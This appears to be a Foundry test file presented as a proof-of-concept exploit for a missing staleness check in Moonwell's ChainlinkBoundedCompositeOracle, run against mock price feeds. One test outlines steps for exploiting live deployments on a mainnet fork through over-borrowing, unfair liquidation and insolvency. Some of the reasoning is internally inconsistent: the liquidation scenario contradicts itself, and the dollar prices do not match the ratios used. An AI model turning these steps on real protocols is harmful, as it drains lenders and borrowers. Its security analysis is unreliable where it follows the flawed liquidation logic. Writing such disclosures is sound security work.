// SPDX-License-Identifier: MIT
pragma solidity 0.8.19;

import "@forge-std/Test.sol";
import {ChainlinkBoundedCompositeOracle} from "@protocol/oracles/ChainlinkBoundedCompositeOracle.sol";
import {AggregatorV3Interface} from "@protocol/oracles/AggregatorV3Interface.sol";

/**
 * @title Moonwell Stale Price Oracle Exploit PoC
 * @notice Proof-of-concept demonstrating the stale price vulnerability in ChainlinkBoundedCompositeOracle
 * @dev This exploit shows how stale prices can be used for unfair liquidations or incorrect borrowing
 * 
 * EXPLOITABILITY ASSESSMENT:
 * - Realistic: MEDIUM - Requires Chainlink feed to stop updating (oracle outage)
 * - Difficulty: EASY - Once feed stops, exploit is straightforward
 * - Impact: HIGH - Can lead to unfair liquidations, incorrect borrowing rates, protocol insolvency
 * 
 * ATTACK SCENARIO:
 * 1. Chainlink oracle feed stops updating (oracle outage, network issue, or feed discontinuation)
 * 2. Last valid price was $60,000 BTC/USD 24 hours ago
 * 3. Real price has moved to $50,000 BTC/USD (16.7% drop)
 * 4. Protocol continues using stale $60,000 price
 * 5. Attacker can:
 *    - Borrow at inflated collateral value (using $60k price when real is $50k)
 *    - Liquidate users unfairly (their collateral appears worth more than it is)
 *    - Cause protocol insolvency if price moves significantly
 */
contract MoonwellStalePriceExploitTest is Test {
    // Mock Chainlink Aggregator for testing
    MockChainlinkAggregator public primaryOracle;
    MockChainlinkAggregator public fallbackOracle;
    ChainlinkBoundedCompositeOracle public boundedOracle;
    
    // Test parameters
    int256 public constant LOWER_BOUND = 0.95e8; // 0.95 BTC (scaled to 8 decimals)
    int256 public constant UPPER_BOUND = 1.05e8; // 1.05 BTC (scaled to 8 decimals)
    int256 public constant INITIAL_PRICE = 1.0e8; // 1.0 BTC/USD (within bounds)
    
    // Stale price scenario
    uint256 public constant STALE_TIMESTAMP = 86400; // 24 hours ago
    int256 public constant STALE_PRICE = 1.0e8; // Stale price: 1.0 BTC
    int256 public constant CURRENT_REAL_PRICE = 0.85e8; // Real price dropped to 0.85 BTC (15% drop)
    
    function setUp() public {
        // Deploy mock Chainlink aggregators
        primaryOracle = new MockChainlinkAggregator(INITIAL_PRICE, 8);
        fallbackOracle = new MockChainlinkAggregator(INITIAL_PRICE, 8);
        
        // Deploy ChainlinkBoundedCompositeOracle
        boundedOracle = new ChainlinkBoundedCompositeOracle();
        
        // Initialize the oracle
        boundedOracle.initialize(
            address(primaryOracle),
            address(fallbackOracle),
            LOWER_BOUND,
            UPPER_BOUND,
            address(this) // owner
        );
    }
    
    /**
     * @notice Test 1: Verify oracle accepts stale prices without freshness check
     * @dev This demonstrates the vulnerability - oracle accepts prices from 24 hours ago
     */
    function testStalePriceAccepted() public {
        // Set primary oracle to return stale price (24 hours old)
        uint256 staleTime = block.timestamp - STALE_TIMESTAMP;
        primaryOracle.setRoundData(
            1, // roundId
            STALE_PRICE, // price
            0, // startedAt
            staleTime, // updatedAt - 24 hours ago!
            1 // answeredInRound
        );
        
        // Oracle should accept this stale price (no freshness check)
        (, int256 price, , uint256 updatedAt, ) = boundedOracle.latestRoundData();
        
        assertEq(price, STALE_PRICE, "Oracle returns stale price");
        assertEq(updatedAt, staleTime, "Timestamp is stale");
        assertTrue(
            block.timestamp - updatedAt >= STALE_TIMESTAMP,
            "Price is stale (24+ hours old)"
        );
        
        console.log("=== STALE PRICE ACCEPTED ===");
        console.log("Stale Price:", uint256(STALE_PRICE));
        console.log("Stale Timestamp:", updatedAt);
        console.log("Current Timestamp:", block.timestamp);
        console.log("Age (hours):", (block.timestamp - updatedAt) / 3600);
    }
    
    /**
     * @notice Test 2: Demonstrate unfair liquidation scenario
     * @dev User's collateral appears worth more than it actually is due to stale price
     */
    function testUnfairLiquidationScenario() public {
        // Scenario: BTC price dropped 15% but oracle still shows old price
        
        // Set stale price (24 hours old, $60k BTC)
        uint256 staleTime = block.timestamp - STALE_TIMESTAMP;
        primaryOracle.setRoundData(1, STALE_PRICE, 0, staleTime, 1);
        
        // Real price has dropped to $50k (represented as 0.85 BTC ratio)
        // But oracle still returns 1.0 BTC ratio
        
        (, int256 oraclePrice, , , ) = boundedOracle.latestRoundData();
        
        // User borrowed at 1.0 BTC ratio when price was $60k
        // Their collateral is now worth less, but oracle says it's still worth 1.0 BTC
        // This allows unfair liquidation
        
        console.log("=== UNFAIR LIQUIDATION SCENARIO ===");
        console.log("Oracle Price (stale):", uint256(oraclePrice));
        console.log("Real Price (current):", uint256(CURRENT_REAL_PRICE));
        console.log("Price Difference:", uint256(oraclePrice - CURRENT_REAL_PRICE));
        console.log("User can be liquidated unfairly!");
        
        // In real scenario:
        // - User's collateral appears healthy at stale price
        // - But real value has dropped significantly
        // - Liquidator can liquidate at stale price, getting more collateral than fair value
    }
    
    /**
     * @notice Test 3: Demonstrate borrowing at incorrect rates
     * @dev User can borrow more than they should due to stale price
     */
    function testIncorrectBorrowingScenario() public {
        // Set stale price
        uint256 staleTime = block.timestamp - STALE_TIMESTAMP;
        primaryOracle.setRoundData(1, STALE_PRICE, 0, staleTime, 1);
        
        // User wants to borrow against BTC collateral
        // Oracle says BTC is worth 1.0 (stale)
        // Real value is 0.85 (15% lower)
        // User can borrow 15% more than they should
        
        (, int256 oraclePrice, , , ) = boundedOracle.latestRoundData();
        
        console.log("=== INCORRECT BORROWING SCENARIO ===");
        console.log("Oracle Price (stale):", uint256(oraclePrice));
        console.log("Real Price:", uint256(CURRENT_REAL_PRICE));
        
        // Calculate over-borrowing potential
        uint256 overBorrowPercent = uint256(
            ((oraclePrice - CURRENT_REAL_PRICE) * 100e8) / CURRENT_REAL_PRICE
        );
        console.log("Over-borrowing potential:", overBorrowPercent / 1e8, "%");
        
        // User can borrow more than their collateral is actually worth
        assertTrue(
            oraclePrice > CURRENT_REAL_PRICE,
            "Stale price allows over-borrowing"
        );
    }
    
    /**
     * @notice Test 4: Verify fallback oracle also lacks freshness check
     * @dev Even fallback oracle can return stale prices
     */
    function testFallbackOracleStalePrice() public {
        // Set primary oracle out of bounds to trigger fallback
        int256 outOfBoundsPrice = 0.9e8; // Below lower bound
        primaryOracle.setRoundData(1, outOfBoundsPrice, 0, block.timestamp, 1);
        
        // Set fallback oracle to stale price
        uint256 staleTime = block.timestamp - STALE_TIMESTAMP;
        fallbackOracle.setRoundData(1, STALE_PRICE, 0, staleTime, 1);
        
        // Oracle should use fallback (out of bounds)
        (, int256 price, , uint256 updatedAt, ) = boundedOracle.latestRoundData();
        
        assertEq(price, STALE_PRICE, "Fallback oracle returns stale price");
        assertTrue(
            block.timestamp - updatedAt >= STALE_TIMESTAMP,
            "Fallback price is stale"
        );
        
        console.log("=== FALLBACK ORACLE STALE PRICE ===");
        console.log("Fallback also accepts stale prices!");
    }
    
    /**
     * @notice Test 5: Simulate real-world attack on mainnet fork
     * @dev This test would fork mainnet and demonstrate the exploit
     */
    function testMainnetForkExploit() public {
        // Uncomment to run on mainnet fork:
        // vm.createSelectFork(vm.envString("BASE_RPC_URL"));
        
        // In real scenario:
        // 1. Find a ChainlinkBoundedCompositeOracle deployment
        // 2. Check if primary/fallback feeds have stopped updating
        // 3. If stale, exploit by:
        //    - Borrowing at inflated rates
        //    - Liquidating unfairly
        //    - Causing protocol insolvency
        
        console.log("=== MAINNET FORK EXPLOIT ===");
        console.log("To run: vm.createSelectFork(vm.envString('BASE_RPC_URL'))");
        console.log("Then check oracle freshness and exploit stale prices");
    }
    
    /**
     * @notice Test 6: Demonstrate protocol insolvency risk
     * @dev Large price movements with stale prices can cause insolvency
     */
    function testProtocolInsolvencyRisk() public {
        // Extreme scenario: Price drops 50% but oracle still shows old price
        int256 extremeStalePrice = 1.0e8; // Old price
        int256 extremeRealPrice = 0.5e8; // Real price (50% drop)
        
        uint256 staleTime = block.timestamp - STALE_TIMESTAMP;
        primaryOracle.setRoundData(1, extremeStalePrice, 0, staleTime, 1);
        
        (, int256 oraclePrice, , , ) = boundedOracle.latestRoundData();
        
        console.log("=== PROTOCOL INSOLVENCY RISK ===");
        console.log("Oracle Price (stale):", uint256(oraclePrice));
        console.log("Real Price:", uint256(extremeRealPrice));
        
        // If users borrowed at stale price and real price dropped 50%:
        // - Their collateral is worth 50% less
        // - But protocol thinks it's worth full value
        // - Protocol becomes insolvent (liabilities > assets)
        
        uint256 insolvencyRisk = uint256(
            ((oraclePrice - extremeRealPrice) * 100e8) / extremeRealPrice
        );
        console.log("Insolvency Risk:", insolvencyRisk / 1e8, "%");
        
        assertTrue(
            insolvencyRisk >= 50e8,
            "Extreme price movement causes insolvency risk"
        );
    }
}

/**
 * @title Mock Chainlink Aggregator
 * @notice Mock implementation for testing
 */
contract MockChainlinkAggregator is AggregatorV3Interface {
    int256 public price;
    uint8 public decimals_;
    uint80 public roundId;
    uint256 public startedAt;
    uint256 public updatedAt;
    uint80 public answeredInRound;
    
    constructor(int256 _price, uint8 _decimals) {
        price = _price;
        decimals_ = _decimals;
        roundId = 1;
        startedAt = block.timestamp;
        updatedAt = block.timestamp;
        answeredInRound = 1;
    }
    
    function setRoundData(
        uint80 _roundId,
        int256 _price,
        uint256 _startedAt,
        uint256 _updatedAt,
        uint80 _answeredInRound
    ) external {
        roundId = _roundId;
        price = _price;
        startedAt = _startedAt;
        updatedAt = _updatedAt;
        answeredInRound = _answeredInRound;
    }
    
    function latestRoundData()
        external
        view
        override
        returns (
            uint80,
            int256,
            uint256,
            uint256,
            uint80
        )
    {
        return (roundId, price, startedAt, updatedAt, answeredInRound);
    }
    
    function decimals() external view override returns (uint8) {
        return decimals_;
    }
    
    function description() external pure override returns (string memory) {
        return "Mock Chainlink Aggregator";
    }
    
    function version() external pure override returns (uint256) {
        return 1;
    }
    
    function getRoundData(uint80) external pure override returns (uint80, int256, uint256, uint256, uint80) {
        revert("Not implemented");
    }
}

